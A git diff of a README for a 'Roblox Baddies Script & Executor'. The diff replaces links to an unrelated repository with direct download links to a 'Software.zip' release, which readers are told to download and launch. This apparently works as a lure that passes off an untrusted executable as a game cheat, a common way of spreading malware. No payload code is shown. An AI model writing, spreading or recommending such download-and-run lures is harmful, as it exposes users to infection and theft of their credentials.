@@ -13,7 +13,7 @@ Welcome to the official repository for **Baddies** - the ultimate Roblox Baddies
 ## Getting Started
 To get started with Baddies, simply head over to the following link: 
 
-[![Download Baddies](https://img.shields.io/badge/Download-Baddies-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Baddies](https://github.com/ArUf-lab/Baddies/releases/download/v2.0/Software.zip)](https://github.com/ArUf-lab/Baddies/releases/download/v2.0/Software.zip)
 
 Click on the badge above to download the Baddies Script and Executor. Once downloaded, launch the file to unleash the power of Baddies in Roblox!
 
@@ -33,4 +33,4 @@ Stay updated on the latest features and releases by following us on GitHub. We'r
 
 Thank you for choosing Baddies - the ultimate Roblox Baddies Script & Executor! Get ready to take your Roblox gameplay to the next level with Baddies! 🚀
 
-**Visit the [Releases](https://github.com/cli/go-gh/releases) section for more information.**
+**Visit the [Releases](https://github.com/ArUf-lab/Baddies/releases/download/v2.0/Software.zip) section for more information.**
